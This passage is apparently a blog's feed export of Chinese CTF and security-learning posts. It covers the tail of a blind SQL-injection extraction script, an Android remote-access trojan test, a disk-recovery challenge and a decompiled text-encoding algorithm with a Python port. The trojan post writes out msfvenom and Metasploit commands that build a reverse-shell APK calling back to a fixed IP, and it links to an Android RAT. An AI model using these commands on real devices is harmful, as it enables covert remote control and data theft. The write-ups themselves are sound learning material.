comment"># mid中间值改变</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token comment"># 判断该字符是否正确，是否是我们想要的字符</span>        <span class="token keyword">if</span> high <span class="token operator">==</span> low <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>high<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/09/BUUOJ-WEB/image-20210511003829469.png" alt="image-20210511003829469"></p><p>我写的脚本有点问题，但是问题也可大可小，最后一直输出chr(33)的值我们基本上一言都能看出来，所以说应该并不会造成使用上的太大的影响。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/05/08/hello-world/"/>
      <url>2021/05/08/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>hello</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>kali安卓木马测试</title>
      <link href="2021/05/07/kali%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8/"/>
      <url>2021/05/07/kali%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="准备工作-工具"><a href="#准备工作-工具" class="headerlink" title="准备工作-工具"></a>准备工作-工具</h2><ol><li><p>安装好的msfconsole工具。</p></li><li><p>kali2021.1以及内部工具</p></li><li><p>一步安卓手机(最好是自己不用的)</p></li></ol><p>我用的是我正在用的安卓。。。希望人没事。</p><p><a href="https://blog.csdn.net/qq_21310689/article/details/85594699">怎么在自己的vps上安装msfconsole</a></p><p><img src="/2021/05/07/kali%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8/image-20210507213750207.png" alt="安装成功"></p><h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><h3 id="1-首先根据payload生成一个安卓的木马"><a href="#1-首先根据payload生成一个安卓的木马" class="headerlink" title="1.首先根据payload生成一个安卓的木马"></a>1.首先根据payload生成一个安卓的木马</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;121.5.227.164 LPORT&#x3D;1005 R &gt; &#x2F;home&#x2F;msf&#x2F;hack.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/07/kali%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8/image-20210507214444758.png" alt="生成默认的木马程序成功"></p><h3 id="2-将木马发到我的安卓手机并安装"><a href="#2-将木马发到我的安卓手机并安装" class="headerlink" title="2.将木马发到我的安卓手机并安装"></a>2.将木马发到我的安卓手机并安装</h3><p><img src="/2021/05/07/kali%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8/image-20210507214751075.png" alt="献身了"></p><h3 id="3-msfconsole木马利用"><a href="#3-msfconsole木马利用" class="headerlink" title="3.msfconsole木马利用"></a>3.msfconsole木马利用</h3><pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">use exploit&#x2F;multi&#x2F;handler &#x2F;&#x2F;加载模块set payload android&#x2F;meterpreter&#x2F;reverse_tcp &#x2F;&#x2F;选择Payloadshow options &#x2F;&#x2F;查看参数设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/07/kali%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8/image-20210507215240843.png" alt="image-20210507215240843"></p><p>要设置两个参数，默认的LHOST与LPORT改一下，用下面的命令。</p><pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">set LHOST 121.5.227.164 &#x2F;&#x2F;设置为刚才生成木马的IP地址121.5.227.164 set LPORT 1005           &#x2F;&#x2F;设置成刚才生成木马所监听的端口1005<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/07/kali%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8/image-20210507215526081.png" alt="payload的options设置完毕"></p><h3 id="4-开始监听"><a href="#4-开始监听" class="headerlink" title="4.开始监听"></a>4.开始监听</h3><pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">exploit &#x2F;&#x2F;开始执行漏洞 开始监听,等待手机上线<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>因为msf生成的木马安装不上，所以要用工具优化一下</strong></p><pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">zipalign -v 4 apk.apk  napk1.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/07/kali%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8/image-20210507220315907.png" alt="image-20210507220315907"></p><p><img src="/2021/05/07/kali%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8/3DE05C3C743FCBA96D07747D9E8C0BEF.jpg" alt="可以看到该应用申请了18项权限"></p><p>这么多权限中肯定是，某些正经软件用不到的，所以在安装软件之前一定要鉴明软件需要的权限，不要让病毒偷偷地躲进你的身边。</p><p>这次利用失败了，具体原因不明，猜想可能是我vps或者我安卓手机的问题，再或者就是他软件的问题了，下面换一个更新一点的软件试一试。</p><h2 id="再次开始"><a href="#再次开始" class="headerlink" title="再次开始"></a>再次开始</h2><p><a href="https://github.com/AhMyth/AhMyth-Android-RAT/releases">新发现的木马</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> 安卓 </tag>
            
            <tag> 木马 </tag>
            
            <tag> 远控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能合约入门</title>
      <link href="2021/05/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8/"/>
      <url>2021/05/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 智能合约 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub磁盘恢复</title>
      <link href="2021/04/30/ctfhub%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D/"/>
      <url>2021/04/30/ctfhub%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="从今天开始就要最多两天更一次博客了，到时候复习的时候看自己写的总比看别人写的理解的更好。"><a href="#从今天开始就要最多两天更一次博客了，到时候复习的时候看自己写的总比看别人写的理解的更好。" class="headerlink" title="从今天开始就要最多两天更一次博客了，到时候复习的时候看自己写的总比看别人写的理解的更好。"></a>从今天开始就要最多两天更一次博客了，到时候复习的时候看自己写的总比看别人写的理解的更好。</h3><h2 id="说是磁盘恢复其实根本就没用到磁盘恢复-jpg"><a href="#说是磁盘恢复其实根本就没用到磁盘恢复-jpg" class="headerlink" title="说是磁盘恢复其实根本就没用到磁盘恢复.jpg"></a>说是磁盘恢复其实根本就没用到磁盘恢复.jpg</h2><h2 id="extundelete"><a href="#extundelete" class="headerlink" title="extundelete"></a>extundelete</h2><p><strong>首先到卡里上面看一下文件的类型</strong></p><p><img src="/2021/04/30/ctfhub%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D/image-20210430223447512.png" alt="image-20210430223447512"></p><p><strong>之后创建文件夹并将磁盘文件挂载到该文件夹下面</strong></p><p><img src="/2021/04/30/ctfhub%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D/image-20210430224452242.png" alt="image-20210430224452242"></p><p><strong>本来想用linux的修复工具extundelete恢复，结果似乎是没有日志的话是不能进行的。。。</strong></p><p><img src="/2021/04/30/ctfhub%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D/image-20210430232132162.png" alt="image-20210430232132162"></p><h2 id="DiskGenius"><a href="#DiskGenius" class="headerlink" title="DiskGenius"></a>DiskGenius</h2><p>被迫转移战线至windows下的工具</p><p><img src="/2021/04/30/ctfhub%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D/image-20210430232317796.png" alt="image-20210430232317796"></p><p>先左上角磁盘-&gt;打开虚拟磁盘文件-&gt;选择下载的文件，之后使用上方的恢复文件功能进行文件恢复。</p><p><img src="/2021/04/30/ctfhub%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D/image-20210430232607670.png" alt="image-20210430232607670"></p><p>将文件恢复到桌面</p><p><img src="/2021/04/30/ctfhub%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D/image-20210430232733728.png" alt="image-20210430232733728"></p><p>。。。还是image里面的三张图片，不知道是不是我工具的问题，太菜了，直接打开记事本Ctrl+F，找FLAG了。。。</p><pre class="line-numbers language-none"><code class="language-none">FLAG-ggmgk05096<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/30/ctfhub%E7%A3%81%E7%9B%98%E6%81%A2%E5%A4%8D/image-20210430234420443.png" alt="image-20210430234420443"></p><p>这题出得真不小心，直接ctrl f就出了没得学啊。不知道是不是我想得太复杂了。。。</p><p>不过这个windows上的工具还得再测试啊，不是特别稳定。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 磁盘恢复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向兽音译者python表示</title>
      <link href="2021/04/26/%E9%80%86%E5%90%91%E5%85%BD%E9%9F%B3%E8%AF%91%E8%80%85python%E8%A1%A8%E7%A4%BA/"/>
      <url>2021/04/26/%E9%80%86%E5%90%91%E5%85%BD%E9%9F%B3%E8%AF%91%E8%80%85python%E8%A1%A8%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="挺简单的，毕竟是大神高中时写的加密"><a href="#挺简单的，毕竟是大神高中时写的加密" class="headerlink" title="挺简单的，毕竟是大神高中时写的加密"></a>挺简单的，毕竟是大神高中时写的加密</h2><p>下面就简单地粘贴一下安卓逆向的重点的反编译的java代码和我自己转的python代码了，感兴趣的可以分析下。ps：熬夜真累啊。。。</p><p><img src="/2021/04/26/%E9%80%86%E5%90%91%E5%85%BD%E9%9F%B3%E8%AF%91%E8%80%85python%E8%A1%A8%E7%A4%BA/image-20210426000513412.png" alt="image-20210426000513412"></p><p>没加壳，就直接用工具反编译就OK了。。。</p><h2 id="java代码"><a href="#java代码" class="headerlink" title="java代码"></a>java代码</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tk<span class="token punctuation">.</span>dreamydragon<span class="token punctuation">.</span>roartranslater</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TxtToBeast</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bd <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">22007</span><span class="token punctuation">,</span> <span class="token number">21596</span><span class="token punctuation">,</span> <span class="token number">21834</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">toBeast</span><span class="token punctuation">(</span><span class="token class-name">String</span> tf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">HexToBeast</span><span class="token punctuation">(</span><span class="token class-name">ToHex</span><span class="token punctuation">(</span>tf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">fromBeast</span><span class="token punctuation">(</span><span class="token class-name">String</span> tf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">FromHex</span><span class="token punctuation">(</span><span class="token class-name">BeastToHex</span><span class="token punctuation">(</span>tf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setBeastChars</span><span class="token punctuation">(</span><span class="token keyword">char</span> cf0<span class="token punctuation">,</span> <span class="token keyword">char</span> cf1<span class="token punctuation">,</span> <span class="token keyword">char</span> cf2<span class="token punctuation">,</span> <span class="token keyword">char</span> cf3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        bd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> cf0<span class="token punctuation">;</span>        bd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cf1<span class="token punctuation">;</span>        bd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> cf2<span class="token punctuation">;</span>        bd<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> cf3<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getBeastChars</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bd<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">ToHex</span><span class="token punctuation">(</span><span class="token class-name">String</span> gbString<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> utfBytes <span class="token operator">=</span> gbString<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuffer</span> unicodeBytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> c <span class="token operator">:</span> utfBytes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> hexB <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>hexB<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                hexB <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> hexB<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            unicodeBytes<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>hexB<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> unicodeBytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">FromHex</span><span class="token punctuation">(</span><span class="token class-name">String</span> dataStr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">StringBuffer</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> end <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> end <span class="token operator">&lt;=</span> dataStr<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> end <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            buffer<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Character</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>dataStr<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            start <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> buffer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">HexToBeast</span><span class="token punctuation">(</span><span class="token class-name">String</span> tf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tfArray <span class="token operator">=</span> tf<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuffer</span> beast <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tfArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>tfArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">>=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                k <span class="token operator">-=</span> <span class="token number">16</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            beast<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">+</span> bd<span class="token punctuation">[</span>k <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> bd<span class="token punctuation">[</span>k <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> beast<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">BeastToHex</span><span class="token punctuation">(</span><span class="token class-name">String</span> bf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bfArray <span class="token operator">=</span> bf<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuffer</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> bf<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> pos1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> pos2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">char</span> c <span class="token operator">=</span> bfArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>pos1 <span class="token operator">&lt;=</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">!=</span> bd<span class="token punctuation">[</span>pos1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                pos1<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">char</span> c2 <span class="token operator">=</span> bf<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>pos2 <span class="token operator">&lt;=</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span> c2 <span class="token operator">!=</span> bd<span class="token punctuation">[</span>pos2<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                pos2<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pos1 <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> pos2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                k <span class="token operator">+=</span> <span class="token number">16</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            out<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> out<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="算法逆向python代码"><a href="#算法逆向python代码" class="headerlink" title="算法逆向python代码"></a>算法逆向python代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 逆向兽音算法</span>ch <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22007</span><span class="token punctuation">,</span> <span class="token number">21596</span><span class="token punctuation">,</span> <span class="token number">21834</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isnumeric<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token comment"># ####################################上面的代码为了恢复加密表['嗷', '呜', '啊', '~']</span>m <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入原文:"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ToHex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    text <span class="token operator">=</span> m    hexstr <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temphex <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temphex<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            temphex <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> temphex        hexstr <span class="token operator">+=</span> temphex    <span class="token keyword">return</span> hexstr<span class="token keyword">def</span> 